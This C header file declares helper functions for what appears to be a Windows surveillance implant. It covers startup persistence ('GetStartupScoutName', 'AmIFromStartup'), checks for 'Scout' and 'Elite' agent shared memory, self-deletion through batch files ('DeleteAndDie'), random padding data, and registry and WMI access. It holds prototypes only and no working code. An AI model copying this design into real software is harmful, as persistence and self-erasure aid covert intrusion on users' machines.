#ifndef _UTILS_H
#define _UTILS_H

#include <Windows.h>
#include <Wbemidl.h>
#include <comdef.h> 
#include <Shobjidl.h>
#pragma comment(lib, "wbemuuid.lib")

#include <stdio.h>
#include <Shlobj.h>
#include <Shlwapi.h>

#define GET_TIME(x)	{__int64 aclock;\
	                 _time64( &aclock );\
					 _gmtime64_s(&x, &aclock);\
					 x.tm_year += 1900;\
					 x.tm_mon ++;}


HRESULT ComCopyFile(__in LPWSTR strSourceFile, __in LPWSTR strDestDir, __in_opt LPWSTR strNewName);
BOOL CreateRegistryKey(HKEY hBaseKey, LPWSTR strSubKey, DWORD dwOptions, DWORD dwPermissions, PHKEY hOutKey);
HKEY GetRegistryKeyHandle(__in HKEY hParentKey, __in LPWSTR strSubKey, __in DWORD dwSamDesidered);
BOOL GetRegistryValue(__in HKEY hRootKey, __in LPWSTR strSubKey, __in LPWSTR strKeyName, __out LPVOID lpBuffer, __in DWORD dwBuffSize, __in DWORD dwSam);
LPWSTR GetScoutSharedMemoryName();
BOOL ExistsEliteSharedMemory();
BOOL ExistsScoutSharedMemory();
BOOL CreateScoutSharedMemory();

LPWSTR GetStartupScoutName();
LPWSTR GetStartupPath();
VOID IsX64System(__out PBOOL bIsWow64, __out PBOOL bIsx64OS);

LPWSTR GetMySelfName();
BOOL AmIFromStartup();
VOID MySleep(__in LONG dwTime);
LPWSTR GetTemp();
VOID DeleteAndDie(__in BOOL bDie);
BOOL StartBatch(__in LPWSTR pName);
VOID CreateDeleteBatch(__in LPWSTR pFileName, __in LPWSTR *pBatchOutName);
VOID CreateReplaceBatch(__in LPWSTR pOldFile, __in LPWSTR pNewFile, __in LPWSTR *pBatchOutName);
VOID CreateCopyBatch(__in LPWSTR pSource, __in LPWSTR pDest, __in LPWSTR *pBatchOutName);
VOID BatchCopyFile(__in LPWSTR pSource, __in LPWSTR pDest);
VOID WaitForInput();
ULONG GetRandomInt(__in ULONG uMin, __in ULONG uMax);
LPWSTR GetRandomStringW(__in ULONG uMin);
LPSTR GetRandomStringA(__in ULONG uMin);
LPBYTE GetRandomData(__in DWORD dwBuffLen);
LPBYTE GetRandomData(__in DWORD dwBuffLen);
VOID AppendRandomData(PBYTE pBuffer, DWORD uBuffLen);
ULONG Align(__in ULONG uSize, __in ULONG uAlignment);
LPBYTE MapFile(LPWSTR strFileName, DWORD dwSharemode);
VOID URLDecode(__in LPSTR strUrl);
LPWSTR UTF8_2_UTF16(LPSTR strSource);
VOID JsonDecode(__in LPSTR strSource);
LPWSTR CreateTempFile();
BOOL WMIExecQueryGetProp(IWbemServices *pSvc, LPWSTR strQuery, LPWSTR strField,  LPVARIANT lpVar);
BOOL WMIExecQuerySearchEntryHash(IWbemServices *pSvc, LPWSTR strQuery, LPWSTR strField, LPBYTE pSearchHash, LPVARIANT lpVar);

#endif // _UTILS_H